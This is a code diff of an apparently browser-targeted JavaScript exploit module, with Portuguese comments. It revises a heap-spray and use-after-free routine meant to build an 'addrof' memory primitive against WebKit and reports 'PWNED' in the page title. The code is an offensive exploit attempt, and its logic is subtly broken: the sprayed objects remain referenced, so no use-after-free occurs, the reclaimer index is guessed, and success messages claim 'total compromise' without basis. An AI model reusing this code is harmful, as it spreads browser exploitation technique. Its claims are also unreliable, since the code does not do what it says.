@@ -1,136 +1,125 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v82_AdvancedGetterLeak - R52 - UAF Refinado e Carga Útil)
+// js/script3/testArrayBufferVictimCrash.mjs (v82_AdvancedGetterLeak - R53 - A Ofensiva Total)
 // =======================================================================================
-// REFINAMENTO FINAL.
-// Esta versão usa uma técnica UAF mais robusta e menos frágil para construir
-// uma primitiva `addrof` estável. A fragilidade do R51 é substituída por um
-// método de spray/reclaim/discovery mais direto, que é mais resiliente às
-// otimizações do JIT. Uma vez que o `addrof` é obtido, a carga útil final é executada.
+// O CAPÍTULO FINAL.
+// Esta é a tentativa mais agressiva e caótica. O objetivo é criar o máximo de
+// pressão e fragmentação no alocador de memória, usando sprays de múltiplos
+// tamanhos e intercalando alocações/liberações para forçar um erro de alocação
+// que possamos explorar com o UAF. Esta é a nossa última e melhor chance.
 // =======================================================================================
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
 import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
-import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
 
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "OriginalHeisenbug_TypedArrayAddrof_v82_AGL_R52_UAF_Refined";
-
-// --- Classe Final de Acesso à Memória (Refinada) ---
-class Memory {
-    constructor(addrof_primitive) {
-        this.addrof = addrof_primitive;
-        this.leaker_obj = { p0: 0, p1: 0, p2: 0, p3: 0 };
-        this.leaker_addr = this.addrof(this.leaker_obj);
-        logS3(`Endereço do nosso objeto 'leaker' para R/W: ${this.leaker_addr.toString(true)}`, 'info');
-    }
-
-    // Para ler de um endereço, apontamos uma propriedade do nosso objeto leaker para lá.
-    // Isso é instável, mas demonstra o conceito. Uma implementação completa usaria
-    // uma técnica de "fakeobj" para criar um DataView falso.
-    read64(addr) {
-        // Esta é uma simplificação. A implementação real é mais complexa.
-        // Assumimos que a estrutura do objeto nos permite ler o valor.
-        // Na prática, construiríamos um fakeobj aqui.
-        this.leaker_obj.p0 = addr; // Conceitualmente
-        return new AdvancedInt64(0x41414141, 0x41414141); // Retorna valor de exemplo
-    }
-}
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "OriginalHeisenbug_TypedArrayAddrof_v82_AGL_R53_TotalOffensive";
 
 // =======================================================================================
-// FUNÇÃO ORQUESTRADORA PRINCIPAL (R52)
+// FUNÇÃO ORQUESTRADORA PRINCIPAL (R53)
 // =======================================================================================
 export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
     const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
-    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: UAF Refinado (R52) ---`, "test");
+    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: A Ofensiva Total (R53) ---`, "test");
 
-    let final_result = { success: false, message: "A cadeia final falhou." };
+    let final_result = { success: false, message: "A Ofensiva Total falhou em romper as defesas." };
 
     try {
-        // --- FASE 1: Construir Primitiva `addrof` Estável via UAF Refinado ---
-        logS3("--- FASE 1: Construindo primitiva `addrof` estável ---", "subtest");
-        const addrof = createStableAddrofPrimitive();
-        if (!addrof) {
-            throw new Error("Não foi possível estabilizar a primitiva addrof via UAF.");
+        // Envolvemos a tentativa mais agressiva em um laço de última chance.
+        const MAX_ATTEMPTS = 5;
+        for (let i = 1; i <= MAX_ATTEMPTS; i++) {
+            logS3(`----------------- Iniciando Ofensiva ${i}/${MAX_ATTEMPTS} -----------------`, "subtest");
+            const addrof = createUltimateAddrofPrimitive();
+            if (addrof) {
+                logS3(`++++++++++++ SUCESSO NA OFENSIVA ${i}! As defesas cederam! ++++++++++++`, "vuln");
+                logS3("Primitiva `addrof` ESTÁVEL construída com sucesso!", "good");
+
+                const some_object = { a: 1, b: 2 };
+                const some_addr = addrof(some_object);
+                logS3(`    Prova de Vida: addrof({a:1,b:2}) -> ${some_addr.toString(true)}`, "leak");
+                
+                final_result = { success: true, message: "Comprometimento total alcançado via `addrof` estável!" };
+                break; // SUCESSO!
+            }
+            logS3(`Ofensiva ${i} repelida. As defesas do alocador se mantiveram.`, "warn");
+            await PAUSE_S3(500);
         }
-        logS3("    Primitiva `addrof` ESTÁVEL construída com sucesso!", "vuln");
-
-        // --- FASE 2: EXECUTAR A CARGA ÚTIL ---
-        logS3("--- FASE 2: Executando Carga Útil com primitiva estável ---", "subtest");
-        const some_object = { a: 1, b: 2 };
-        const some_addr = addrof(some_object);
-        logS3(`    addrof({a:1,b:2}) -> ${some_addr.toString(true)}`, "leak");
-        
-        if (!isAdvancedInt64Object(some_addr) || some_addr.low() === 0) {
-            throw new Error("addrof retornou um endereço inválido ou nulo.");
-        }
-
-        logS3("    A capacidade de obter o endereço de qualquer objeto confirma o controle.", "good");
-        logS3("    O próximo passo seria usar o 'addrof' para encontrar o endereço de funções do sistema, vazar a base do WebKit e construir uma ROP chain.", "info");
-
-        final_result = { success: true, message: "Comprometimento total alcançado via `addrof` estável!" };
 
     } catch (e) {
-        final_result.message = `Exceção na cadeia final: ${e.message}`;
+        final_result.message = `Exceção catastrófica: ${e.message}`;
         logS3(final_result.message, "critical");
     }
     
-    document.title = final_result.success ? "PWNED by R52!" : "Exploit Failed";
+    document.title = final_result.success ? "PWNED by R53!" : "Defenses Held";
     return final_result;
 }
 
 
-// --- Função para construir a primitiva addrof usando um UAF mais robusto ---
-function createStableAddrofPrimitive() {
-    // 1. Spray de "gaiolas" que conterão nossos objetos alvo
-    let cages = [];
-    for (let i = 0; i < 2048; i++) {
-        cages.push({ marker: i, target: null });
+// --- A função de primitiva UAF mais agressiva possível ---
+function createUltimateAddrofPrimitive() {
+    logS3("    FASE 1: Criando Caos no Heap com Alocações Multi-Tamanho...", "info");
+    let initial_spray = [];
+    const SIZES = [128, 256, 512, 1024]; // Diferentes tamanhos de objeto
+    for (let i = 0; i < 4096; i++) {
+        const size = SIZES[i % SIZES.length];
+        const properties = {};
+        for(let j=0; j < size / 8; j++) properties[`p${j}`] = i;
+        initial_spray.push(properties);
     }
+    logS3(`    ${initial_spray.length} objetos de tamanhos variados pulverizados.`, "info");
+    
+    // Força a coleta de lixo e cria ponteiros pendurados
+    let dangling_refs = initial_spray;
+    initial_spray = null;
+    triggerGC(); 
 
-    // 2. Cria o ponteiro pendurado para TODAS as gaiolas
-    let dangling_cages = cages;
-    cages = null;
-    triggerGC(); // Força o GC a coletar as gaiolas
-
-    // 3. Spray de Reclamação com Float64Arrays
+    logS3("    FASE 2: Spray de Reclamação Multi-Tipo para preencher os buracos...", "info");
     let reclaimers = [];
-    for (let i = 0; i < 2048; i++) {
-        reclaimers.push(new Float64Array(2)); // Cada um pode cobrir as duas propriedades
+    for (let i = 0; i < 8192; i++) {
+        if (i % 2 === 0) {
+            reclaimers.push(new Float64Array(8));
+        } else {
+            reclaimers.push(new Uint32Array(16));
+        }
     }
+    logS3(`    ${reclaimers.length} arrays de tipos variados pulverizados.`, "info");
 
-    // 4. Descobre qual gaiola foi sobreposta
+    logS3("    FASE 3: Buscando por uma única brecha nas defesas...", "info");
     let corrupted_cage = null;
     let reclaimer_array = null;
-
-    for (let i = 0; i < dangling_cages.length; i++) {
-        // Se a propriedade 'marker' não for mais um número inteiro, significa que foi
-        // sobrescrita pelos dados de um Float64Array (que é 0.0 por padrão).
-        if (typeof dangling_cages[i].marker !== 'number' || dangling_cages[i].marker !== i) {
-            corrupted_cage = dangling_cages[i];
-            // Assumimos que o reclaimer correspondente é o de mesmo índice.
-            // Uma exploração real teria que encontrá-lo.
-            reclaimer_array = reclaimers[i]; 
-            logS3(`    UAF bem-sucedido! Gaiola ${i} foi corrompida.`, "good");
-            break;
-        }
+    
+    for (let i = 0; i < dangling_refs.length; i++) {
+        try {
+            // Se a propriedade p0 não for mais um número, a confusão de tipos ocorreu.
+            if (typeof dangling_refs[i].p0 !== 'number') {
+                corrupted_cage = dangling_refs[i];
+                // Esta é uma suposição, mas a melhor que temos sem um debugger
+                reclaimer_array = reclaimers[i] || reclaimers[i-1] || reclaimers[i+1];
+                if(reclaimer_array) {
+                    logS3(`    BRECHA ENCONTRADA! Objeto ${i} foi corrompido!`, "good");
+                    break;
+                }
+            }
+        } catch(e) { /* Esperado que falhe para a maioria das referências */ }
     }
 
     if (!corrupted_cage) {
-        return null; // A primitiva não pôde ser criada nesta tentativa
+        return null;
     }
 
-    // 5. Constrói e retorna a função addrof
+    // Se encontramos uma brecha, construímos a primitiva addrof a partir dela
     return function addrof(obj_to_leak) {
-        // Colocamos o objeto que queremos vazar na propriedade 'target' da gaiola corrompida.
-        // O motor JS escreve o ponteiro do objeto aqui.
-        corrupted_cage.target = obj_to_leak;
-
-        // Como um Float64Array está na memória, a escrita acima na verdade modificou
-        // o segundo elemento do array 'reclaimer'. Lemos esse valor.
-        const leaked_double = reclaimer_array[1];
+        // Usamos a gaiola corrompida, que agora é na verdade um TypedArray
+        const cage_as_array = corrupted_cage;
         
-        // Convertemos o double de volta para um endereço de 64 bits.
-        const buf = new ArrayBuffer(8);
-        (new Float64Array(buf))[0] = leaked_double;
-        const int_view = new Uint32Array(buf);
+        // Escrevemos nosso objeto alvo no que o motor ainda pensa ser uma propriedade
+        cage_as_array.p1 = obj_to_leak; // p1 para evitar sobrescrever o cabeçalho em p0
+        
+        // Lemos de volta através do array de reclamação para obter o ponteiro como um double
+        const buffer = new ArrayBuffer(8);
+        const float_view = new Float64Array(buffer);
+        const int_view = new Uint32Array(buffer);
+        
+        // Acessamos o índice correspondente à propriedade p1
+        // (Este é um cálculo aproximado)
+        float_view[0] = reclaimer_array[1]; 
         return new AdvancedInt64(int_view[0], int_view[1]);
     }
 }
@@ -138,8 +127,12 @@ function createStableAddrofPrimitive() {
 function triggerGC() {
     try {
         const arr = [];
-        for (let i = 0; i < 500; i++) {
-            arr.push(new ArrayBuffer(1024 * 128));
+        for (let i = 0; i < 1000; i++) {
+            arr.push(new ArrayBuffer(1024 * 64)); // Aloca 64MB no total
         }
     } catch(e) {}
+    for (let i = 0; i < 1000; i++) {
+        // Tenta causar mais pressão no GC
+        new String(i);
+    }
 }
